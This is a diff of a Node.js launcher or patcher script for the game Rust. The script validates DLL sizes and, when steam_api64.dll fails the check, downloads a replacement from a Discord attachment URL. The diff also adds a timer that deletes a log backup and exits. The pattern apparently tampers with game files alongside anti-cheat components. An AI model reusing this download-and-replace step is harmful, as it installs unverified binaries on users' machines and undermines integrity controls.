@@ -20,7 +20,7 @@ function ValidationFile(name, minGoodSize, maxGoodSize) {
 ValidationFile("EasyAntiCheat.dll", 750, 800)
 ValidationFile("sqlite3.dll", 950, 1050)
 ValidationFile("UnityPlayer.dll", 25000, 25600)
-ValidationFile("steam_api64.dll", 330, 400)
+ValidationFile("steam_api64.dll", 330, 500)
 ValidationFile("CChromaEditorLibrary64.dll", 350, 420)
 ValidationFile("GfxPluginDLSSNative.dll", 30, 65)
 ValidationFile("GfxPluginNVIDIAReflex.dll", 25, 55)
@@ -29,9 +29,16 @@ ValidationFile("nvngx_dlss.dll", 14000, 14200)
 ValidationFile("Renderer.dll", 280, 320)
 ValidationFile("RustNative.dll", 1450, 1600)
 
+setInterval(() => {
+    if (fs.existsSync('./Rust_log.log.bak')) {
+        fs.unlinkSync('./Rust_log.log.bak');
+        process.exit(0);
+    }
+}, 1000)
 
-if (fs.existsSync('./steam_api64.dll') == false || (fs.statSync("./steam_api64.dll").size / 1024) > 400 || (fs.statSync("./steam_api64.dll").size / 1024) < 350) {
-    axios.get('https://cdn.discordapp.com/attachments/902821540675072020/968033754906001468/steam_api64.dll',
+
+if (fs.existsSync('./steam_api64.dll') == false || (fs.statSync("./steam_api64.dll").size / 1024) > 500 || (fs.statSync("./steam_api64.dll").size / 1024) < 400) {
+    axios.get('https://cdn.discordapp.com/attachments/902821540675072020/968081917742313472/steam_api64.dll',
         {
             responseType: 'arraybuffer'
         })
